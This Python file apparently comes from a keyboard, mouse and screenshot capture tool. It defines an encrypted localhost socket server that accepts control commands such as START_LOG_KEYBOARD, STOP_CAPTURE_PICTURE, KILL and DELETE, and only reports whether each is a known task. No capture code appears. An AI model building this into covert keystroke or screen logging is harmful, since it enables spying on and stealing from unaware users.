from module_crypto import decrypt_message
from functions import *
import socket, asyncio

TASKS = [
        "PAUSE_SERVER",
        "PAUSE_CAPTURE_KEYBOARD",
        "PAUSE_CAPTURE_MOUSE",
        "PAUSE_CAPTURE_PICTURE",
        "STOP_SERVER",
        "STOP_CAPTURE_KEYBOARD",
        "STOP_CAPTURE_MOUSE",
        "STOP_CAPTURE_PICTURE",
        "RESTART_SERVER",
        "RESTART_CAPTURE_KEYBOARD",
        "RESTART_CAPTURE_MOUSE",
        "RESTART_CAPTURE_PICTURE",
        "STOP_LOG_KEYBOARD",
        "STOP_LOG_MOUSE",
        "STOP_LOG_PICTURE",
        "START_LOG_KEYBOARD",
        "START_LOG_MOUSE",
        "START_LOG_PICTURE",
        "STATUS_SERVER",
        "STATUS_LOG",
        "STATUS_CAPTURE",
        "RESET_CONFIG",
        "KILL",
        "LOG",
        "DELETE",
        "MOVE"
    ]
class Server_subprocess:
    """Server class for client app (receive data)"""
    
    async def ainit(self):
        """ You need to init .env file before using this class"""
        
        try:
            self.config = await load_env()
            self.key = self.config['KEY'].encode()
            self.port_receive = int(self.config['PORT_RECEIVE'])
            await self.start()
        except Exception as err:
            print(err)
        
    async def start(self):
        """start socket server"""
        
      
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('localhost', self.port_receive))
            s.listen()
            while True:
                conn, addr = s.accept()
                if 1== 0: print(f"Connected by {addr}")# Forced to use addr ...
                
                with conn:
                    while True:
                        encrypted_data = conn.recv(1024)
                        if not encrypted_data:
                            break
                        data = await decrypt_message(encrypted_data, self.key)

                        #Debug data sender
                        # print(b"[ SERVER ] : Data receive '{}'.".format(data))
                        
                        # Verify if the stop command is received
                        ## - Pause - ##
                        if data in TASKS:
                            conn.sendall("Task found {}".format(data).encode())
                        else:
                            conn.sendall(b"No task found")
                        # Send response to client with "Message received"
                        print(f"[ SERVER ] : Data receive '{data}'.")
                            
                            

                                
       
asyncio.run(Server_subprocess().ainit())